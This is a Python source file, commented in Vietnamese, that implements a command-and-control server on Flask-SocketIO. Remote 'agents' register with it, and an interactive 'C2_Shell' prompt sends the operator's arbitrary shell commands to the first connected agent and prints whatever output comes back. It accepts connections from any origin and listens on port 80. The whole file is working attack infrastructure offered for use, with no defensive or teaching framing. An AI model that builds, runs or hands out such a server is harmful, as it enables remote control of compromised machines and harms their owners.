from flask import Flask, request
from flask_socketio import SocketIO, emit
import threading
import time

# khoi tao server
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins='*') # cho phep moi ket noi

# bo nho quan ly agents
agents = {}

@socketio.on('connect')
def handle_connect():
    print(f"[+] client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # tim va xoa agent da ngat ket noi khoi danh sach
    disconnected_sid = request.sid
    for agent_id, info in list(agents.items()):
        if info['sid'] == disconnected_sid:
            print(f"[-] agent disconnected: {agent_id}")
            del agents[agent_id]
            break

@socketio.on('register')
def handle_register(data):
    agent_id = data.get('agent_id')
    agents[agent_id] = {
        "sid": request.sid,
        "info": data
    }
    print(f"[*] new agent registered: {agent_id} | sid: {request.sid}")

@socketio.on('command_result')
def handle_result(data):
    print(f"\n[v] result from {data.get('agent_id')}:\n{data.get('output')}")
    print("C2_Shell > ", end="", flush=True) # in lai dau nhac lenh cho dep

def cmd_interface():
    time.sleep(2) # doi server khoi dong
    while True:
        try:
            if not agents:
                print("[!] waiting for agents...", end="\r")
                time.sleep(1)
                continue

            cmd = input("\nC2_Shell > ")
            if not cmd: continue
            
            # lay agent dau tien de test
            target_id = list(agents.keys())[0]
            sid = agents[target_id]['sid']
            
            socketio.emit('execute_command', {'cmd': cmd}, room=sid)
            print(f"[*] sent '{cmd}' to {target_id}...")
            
        except Exception as e:
            print(f"[!] shell error: {e}")

if __name__ == '__main__':
    # chay luong nhap lieu rieng
    t = threading.Thread(target=cmd_interface, daemon=True)
    t.start()
    
    print("[*] c2 server listening on port 80...")
    socketio.run(app, port=80, debug=False, allow_unsafe_werkzeug=True)